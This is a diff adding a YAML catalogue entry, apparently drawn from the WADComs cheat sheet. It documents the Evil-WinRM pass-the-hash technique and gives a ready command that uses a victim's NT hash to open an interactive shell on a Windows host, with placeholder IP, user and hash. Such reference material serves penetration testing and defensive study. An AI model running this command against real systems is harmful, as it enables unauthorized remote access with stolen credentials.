@@ -1,0 +1,76 @@
+id: wadcoms/Evil-WinRM-PTH
+type: technique
+platform: active-directory
+name: Evil WinRM PTH
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: GPL-3.0
+  upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+  last_synced: '2026-11-13'
+preconditions:
+- a valid username
+- an NTLM hash (pass-the-hash)
+commands:
+- template: evil-winrm -i 10.10.10.1 -u john -H c23b2e293fa0d312de6f59fd6d58eae3
+  comment: "Evil-WinRM uses the Windows Management Instrumentation (WMI) to give you an interactive shell\
+    \ on the Windows host. Evil-WinRM supports passing the victim's NT hash for authorization.\n\nCommand\
+    \ Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tUsername: john\n\n\tNT Hash: c23b2e293fa0d312de6f59fd6d58eae3\n"
+references:
+- https://github.com/Hackplayers/evil-winrm
+tags:
+- active-directory
+- wadcoms
+- wmi
+source_data:
+  WADComs:
+    raw:
+      file: Evil-WinRM-PTH.md
+      document: "---\ndescription: |\n  Evil-WinRM uses the Windows Management Instrumentation (WMI) to\
+        \ give you an interactive shell on the Windows host. Evil-WinRM supports passing the victim's\
+        \ NT hash for authorization.\n\n  Command Reference:\n\n  \tTarget IP: 10.10.10.1\n\n  \tUsername:\
+        \ john\n\n  \tNT Hash: c23b2e293fa0d312de6f59fd6d58eae3\n\n\ncommand: |\n  evil-winrm -i 10.10.10.1\
+        \ -u john -H c23b2e293fa0d312de6f59fd6d58eae3\nitems:\n  - Username\n  - Hash\nservices:\n  -\
+        \ WMI\nOS:\n  - Linux\n  - Windows\nattack_types:\n  - Exploitation\nreferences:\n  - https://github.com/Hackplayers/evil-winrm\n\
+        ---\n"
+    upstream_url: https://wadcoms.github.io
+    upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  privilege_required:
+    value: domain-user
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    WADComs: sha256:3cc7957d243789d76513dde48e1cb1aac7765175debb3065db0a8df85c5d075b
